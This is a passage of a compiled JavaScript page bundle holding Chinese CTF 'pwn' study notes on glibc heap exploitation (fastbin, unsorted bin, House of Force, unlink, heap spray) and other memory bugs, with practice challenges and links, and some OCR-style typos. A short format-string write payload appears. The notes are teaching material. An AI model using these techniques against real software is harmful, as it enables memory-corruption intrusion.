"),t("li",[t("p",[e._v("http://blog.csdn.net/sdulibh/article/details/47375969")])])]),e._v(" "),t("p",[e._v("Heap Overflow-Overflow Directly\n直接覆盖相邻堆块的内存的内容。\n关键：如何让想被覆盖的堆块正好在具有溢出漏洞的堆块之后。")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("堆风水/堆排布：通过操纵内存的分配与释放，来控制堆块装内存中的相对位置。")])]),e._v(" "),t("li",[t("p",[e._v("堆排布几乎是所有堆漏洞利用所必需的技能，需要对glibc内存管理策略非常熟悉。知道什么时\n候分析什么内存。再次强调：一定要阅读且经常翻阅“glibc内存管理ptmalloc源代码分析.pdf”\n！！！\n例题：XMAN2016 fengshui（zijinghua pwn），SSC安全大会百度展厅heapcanary\n作业：完成heapcananry\n其实真实环境中大多数漏洞都是通过这种方式进行利用的。但是CTF中不算特别常见。\n（因为太简单了）")])])]),e._v(" "),t("p",[e._v("Heap Overflow-Fast bin attack改写fastbin单向链表中的fd，那再次分配就会分配到被改写的d指向的地址改写目标必须有一个正确的size对应，否则会挂\nCTF中的套路：如果bss上有指针，通常会改到bss的指针附近，再次分配可以分配到bss地址，修改新分配的内容便可以修改bss上的指针。\n另外还有：House of Spirit例题：\nalictf 2016fb（作业，推荐完成）alictf 2016 starcraft Octf 2016 zerostorage（比较难）推荐阅读：\n另外还有：House of Spirit\n例题：\nalictf 2016fb（作业，推荐完成）\nalictf 2016 starcraft\nOctf 2016 zerostorage（比较难）\n推荐阅读：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("http://www.freebuf.com/news/88660.html")])]),e._v(" "),t("li",[t("p",[e._v("http:/angelboy.logdown.com/posts/291983-heap-exploitation")])])]),e._v(" "),t("p",[t("strong",[e._v("Heap Overflow-unsorted bin attack")])]),e._v(" "),t("p",[e._v("利用思路：")]),e._v(" "),t("ul",[t("li",[e._v("通过堆溢出覆盖victim->bk为要写入的地址-4，再次分配时bck->fd=unsorted_chunks（av）会触")])]),e._v(" "),t("p",[e._v("发一个任意地址写。写入的内容是libc中的一个地址。只不过此时unsortbin被破坏，再次分配代\n码会崩掉，所以要谨慎考虑写入的地址，通常可以改写global_max_fast，从而导致接下来所有分\n配都是在fastbin进行。")]),e._v(" "),t("ul",[t("li",[e._v("通过堆溢出覆盖victim->bk为一个size为x的fake chunk，再次分配unsorted_chunks（av）->bk=")])]),e._v(" "),t("p",[e._v("bck会改写unsortbin链表头的bk，此时再分配x-4大小的内存即可返回fakechunk。\n习题：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Octf2016 Zerostorage（http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/）")])]),e._v(" "),t("li",[t("p",[e._v("第一步unsortedbin attack改写global max fast，第二步fastbin attack")])])]),e._v(" "),t("p",[e._v("当需要分配的内存无法在fastbin或者smallbin找到时，glibc会从unsort bins的链表头的bk\n开始遍历，遍历过程中会把unsortbin中的块加入合适的smalbin/largebin中，如果找到合适\n大小内存块则会返回。\nbck=victim->bk；\nunsorted_chunks（av）->bk=bck；\nbck->fd=unsorted_chunks（av）；")]),e._v(" "),t("p",[t("strong",[e._v("Heap Overflow-Overwrite Topchunk")])]),e._v(" "),t("p",[e._v("House of Force：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Bin中没有任何合适的内存时会从Topchunk分配内存：")])]),e._v(" "),t("li",[t("p",[e._v("Iftopchunk->size>alloc_size）（victim=topchunk；topchunk =topchunk-alloc_size；return\nvictim；}")])]),e._v(" "),t("li",[t("p",[e._v("改写Topchunk的size为一个很大的数，如0xfff，分配alloc_size-4大小的内存。由于alloc_size")])])]),e._v(" "),t("p",[e._v("可控，所以此时topchunk位置可控，再次分配即可分配到想分配的位置")]),e._v(" "),t("ul",[t("li",[e._v("需要预先泄漏topchunk的地址")])]),e._v(" "),t("p",[e._v("例题：BCTF 2016bcloud（推荐完成）BCTF 2016ruin（arm结构的程序，选做）\n推荐阅读：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("htps://gbmaster.wordpress.com/2015/06/28/x86-exploitation-10 1-house-of-force-iedi-overflowl")])]),e._v(" "),t("li",[t("p",[e._v("http://angelboy.logdown.com/posts/291983-heap-exploitation")])])]),e._v(" "),t("p",[t("strong",[e._v("Heap Overflow-Classical&Modern Unlink Attack")])]),e._v(" "),t("p",[e._v("Unlink：当free（mem）调用时，如果与mem相邻的块是空闲的，则会将其从空闲链表中拿\n（unlink）下来并与mem合并。\n#define unlink（P，BK，FD）{\nBK=P->bk；\nFD=P->fd：\nFD->bk=BK；\nBK->fd=FD；\nClassical Unlink Attack：\n如果通过heapoverflow将P->bk以及P->fd覆盖为攻击者可控制的地址，那FD->bk=BK；BK->fd=\nFD；=>P->fd->bk=P->bk；P->bk->fd=p->fd；造成任意写。不过要求（要写的内容+4）or（要写的内容+8）\n必须可写，否则会崩。\n已不可用，现代glibc已有此检查：P->fd->bk==P&&P->bk->fd==P")]),e._v(" "),t("p",[e._v("Heap Overflow-Classical&.Modern Unlink Attack\nModern Unlink Attack：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("找一个Pointer X，“X=P，Overflow P->bk=X-4；P->fd=X-8")])]),e._v(" "),t("li",[t("p",[e._v("P->bk->fd==X-4->fd ==P，P->fd->bk==X-8->bk==P")])]),e._v(" "),t("li",[t("p",[e._v("Unlink可得到‘P=X，此时可通过P修改X，如果X是数据指针则可能造成任意地址读写。")])])]),e._v(" "),t("p",[e._v("例题：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Hitcon 2014 qualifier stkof （Modern Unlink Attack）（作业推荐完成）")])]),e._v(" "),t("li",[t("p",[e._v("MMA CTF 2016Dairy （Off by one+Classic Unlink Attack +sandbox bypass）")])]),e._v(" "),t("li",[t("p",[e._v("PlaidCTF 2014200 ezhp（Classic Unlink Attack）（作业推荐完成）")])])]),e._v(" "),t("p",[e._v("推荐阅读：")]),e._v(" "),t("ul",[t("li",[e._v("https://gbmaster.wordpress.com/2014/08/11/×86-exploitation-101-heap-overflows-unlink-me-would-you-")])]),e._v(" "),t("p",[e._v("please/")]),e._v(" "),t("ul",[t("li",[e._v("http:/lacez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflowl")])]),e._v(" "),t("p",[t("strong",[e._v("Off by one & Off by null")])]),e._v(" "),t("p",[e._v("off by one：溢出位数为1的溢出漏洞\noff by null：溢出位数为1且溢出内容为nul的溢出漏洞\n在glibc中，如果攻击者可以控制malloc的大小和malloc与free的时机，堆中的Off by one\n和Off by nu是可用的，通常可以构造出UAF，进而构造任意地址读写&控制流劫持。\n主要利用思路：改写下一个chunk的chunk size（including inuse bit）\n作业：阅读论文Glibc_Adventures-The_Forgotten_Chunks.pdf\n习题：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Off By one:MMA CTF 2016 Dairy （Off by one+Classic Unlink Attack +sandbox bypass）")])]),e._v(" "),t("li",[t("p",[e._v("Off By nullplaid CTF 2015 datastore，XMAN 2016 Final love_letter\n其他推荐阅读")])]),e._v(" "),t("li",[t("p",[e._v("http://angelboy.logdown.com/posts/567673-advanced-heap-exploitation")])])]),e._v(" "),t("p",[t("strong",[e._v("General exploit techniques-Heap fengshui")])]),e._v(" "),t("p",[e._v("高级堆排布技术：Heap fengshui\n动机：真实漏洞在利用的时候，堆是混乱的，因为存在漏洞的服务可能已经服务过很多\n用户，在触发漏洞时无法预计堆已经做了多少次malloc多少次ree。\nHeap fengshui可以让堆从混乱状态转换为确定状态\n不同的内存管理策略对应的heap fengshui的方法不同，Example：")]),e._v(" "),t("ul",[t("li",[e._v("For glibc fastbin：把每种可能的大小都分配好多次。")])]),e._v(" "),t("p",[e._v("CTF题目一般不需要利用这种技术，因为大多数CTF题目都是程序启动后立刻被攻击者\n利用，堆处于确定的状态。\n例题：XMAN 2016 fengshui，33c3 CTF babyfengshui\n作业：完成以上题目")]),e._v(" "),t("p",[t("strong",[e._v("General exploit techniques-Heap spray")])]),e._v(" "),t("p",[e._v("Heap spray，堆喷：不断分配内存，并填充（大量0x0c）+shellcode，直到0x0c0c0c0c内存\n地址被分配，多用于脚本语言漏洞的利用。\n大多数内存地址的值都是0x0c0c0c0c，0x0c0c0c0c地址也是0xOcslide+shellcode可以\n用其绕过ASLR，控制流劫持（jmp addr/jmp *addr）时，只要addr是喷过地址都可以执行")]),e._v(" "),t("p",[e._v("shellcode，注意"),t("code",[e._v("*addr=0x0c0c0c0c**addr=0x0c0c0c0c***addr=0x0c0c0c")]),e._v("。")]),e._v(" "),t("p",[e._v("必须在NX关闭时才能直接利用heap spray劫持控制流\n例题：pwnhub.cn calc\n推荐阅读：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("http://www.tuicool.com/articles/3ul")])]),e._v(" "),t("li",[t("p",[e._v("https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/BJv")])])]),e._v(" "),t("h2",{attrs:{id:"其他漏洞-内存破坏可不止溢出"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#其他漏洞-内存破坏可不止溢出"}},[e._v("#")]),e._v(" 其他漏洞-内存破坏可不止溢出")]),e._v(" "),t("h3",{attrs:{id:"_01格式化字符串"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_01格式化字符串"}},[e._v("#")]),e._v(" 01格式化字符串")]),e._v(" "),t("p",[e._v("格式化串介绍：https:/len.wikipedia.org/wiki/Printf format string\n格式化串相关函数：printf、fprintf、sprint等\n格式化漏洞：")]),e._v(" "),t("ul",[t("li",[e._v('触发形如printf（fimtstr）的调用，fmtstr="%S22p”时可以打印栈指针之后第22个DWORD，')])]),e._v(" "),t("p",[e._v("fmtstr=*%1000c%S22n”时可以将栈指针之后第22个DWORD作为地址写入1000")]),e._v(" "),t("ul",[t("li",[e._v("https/www.exploit-db.com/docs/28476.pdf")])]),e._v(" "),t("p",[e._v("例题")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("MMACTF 2016greeting")])]),e._v(" "),t("li",[t("p",[e._v("HCTF 2016heap（利用格式化串漏洞leak栈中的数据）")])]),e._v(" "),t("li",[t("p",[e._v("RuCTF 2016 weather")])]),e._v(" "),t("li",[t("p",[e._v("作业：完成MMACTF 2016 greeting")])])]),e._v(" "),t("h3",{attrs:{id:"_02竞争条件漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_02竞争条件漏洞"}},[e._v("#")]),e._v(" 02竞争条件漏洞")]),e._v(" "),t("p",[e._v("竞争条件漏洞\n竞争条件：竞争条件指多个线程或者进程在读写一个共享数据。竞争条件发生时程序最\n终的结果依赖于多个进程的指令执行顺序\n通过竞争条件，我们可以让程序执行超出预期的行为，如：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("Thread1：free（p1），p1=0；")])]),e._v(" "),t("li",[t("p",[e._v("Thread2：p2=malloc（），read（p2），p1->calfunc（）")])])]),e._v(" "),t("p",[e._v("如果Thread1执行完第一条语句，Thread2开始执行并执行至最后一条语句，则会产生Use After Free\n进而控制流劫持。\n关键：如何控制线程执行的顺序。大名鼎鼎的脏牛就是这类漏洞\n例题：\n·安恒杯武汉大学邀请赛fackfuzz（多线程竞争条件造成UAF）\n·Stupid shell（多进程竞争条件造成越权读文件）")]),e._v(" "),t("h3",{attrs:{id:"_03代码逻辑漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_03代码逻辑漏洞"}},[e._v("#")]),e._v(" 03代码逻辑漏洞")]),e._v(" "),t("p",[e._v("代码在实现过程中因逻辑错误所产生的漏洞，如：")]),e._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",[t("code",[e._v("if（len>=size）free（ptr）；\nif（len>size）ptr=malloc（en），read（ptr）；\nelse read（ptr）\n")])])]),t("p",[e._v("第二个f少了一个等号，从而导致了UAF。\n代码逻辑漏洞的表现方式多种多样，没有定式，难以自动化检测\n例题：UCTF 2016note代码逻辑漏洞导致的控制流劫持")]),e._v(" "),t("h3",{attrs:{id:"_04类型混淆漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_04类型混淆漏洞"}},[e._v("#")]),e._v(" 04类型混淆漏洞")]),e._v(" "),t("p",[e._v("将类型A的对象当作类型B的对象进行引用与操作")]),e._v(" "),t("ul",[t("li",[e._v("显式类型转换导致的类型混淆：static_cast 子类转父类")])]),e._v(" "),t("p",[e._v("static_cast在编译时C++编译器会检查转换前的类型和转换后的类型是否兼容，编译器只允许derived class\n转换为base class或base class转换为derived class。前者称为upcast，后者称为downcast。由于derived\nclass的内存布局通常包含base class，所以upcast通常会存在安全问题，但是downcast却可能会存在类型\n混滴的问题。如说在base class的对象中使个只有derived class存在的成员就会产内存越界访问")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("代码中的逻辑错误或漏洞导致的类型混淆：破坏了类/结构体中的表示类型数据（广义）")])]),e._v(" "),t("li",[t("p",[e._v("如修改vatable也算一种类型混淆")])])]),e._v(" "),t("p",[e._v("例题：无，建议看看类型混滴的CVE，如CVE-2015-3077，目前在CTF中没有看到相关题目")]),e._v(" "),t("h3",{attrs:{id:"_05缓冲区未初始化"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_05缓冲区未初始化"}},[e._v("#")]),e._v(" 05缓冲区未初始化")]),e._v(" "),t("p",[e._v("栈未初始化时，栈中数据为上次函数调用留下的栈帧\n堆未初始化时，堆中数据为上次使用该堆块所留下的数据\n利用举例：")]),e._v(" "),t("ul",[t("li",[t("p",[e._v("若data在栈上且未初始化，代码read（data），puts（data）；可能会造成栈中数据被打印出来")])]),e._v(" "),t("li",[t("p",[e._v("若ptr在栈上且未初始化，代码read（ptr）；可能会导致任意写")])]),e._v(" "),t("li",[t("p",[e._v("若ptr在堆上且未初始化，i（ptr->datal=null）read（ptr->data）可能导致任意写")])])]),e._v(" "),t("p",[e._v("例题：\nUCTF 2016 note（可以用栈未初始化漏洞做）\n华山杯2016决赛SU_PWN（栈未初始化漏洞泄漏栈地址）\n33C3 CTF PWN")]),e._v(" "),t("h1",{attrs:{id:"writeup"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#writeup"}},[e._v("#")]),e._v(" WriteUp")]),e._v(" "),t("h2",{attrs:{id:"ctf中pwn赛题解析"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ctf中pwn赛题解析"}},[e._v("#")]),e._v(" CTF中PWN赛题解析")]),e._v(" "),t("h2",{attrs:{id:"百度杯-pwn2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#百度杯-pwn2"}},[e._v("#")]),e._v(" 百度杯 pwn2")]),e._v(" "),t("p",[e._v("浮点数在二进制表示方法（内存中显示方法）")]),e._v(" "),t("h2",{attrs:{id:"q"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#q"}},[e._v("#")]),e._v(" Q")]),e._v(" "),t("p",[e._v("gdb: fini 是什么")])])}),[],!1,null,null,null);n.default=l.exports}}]);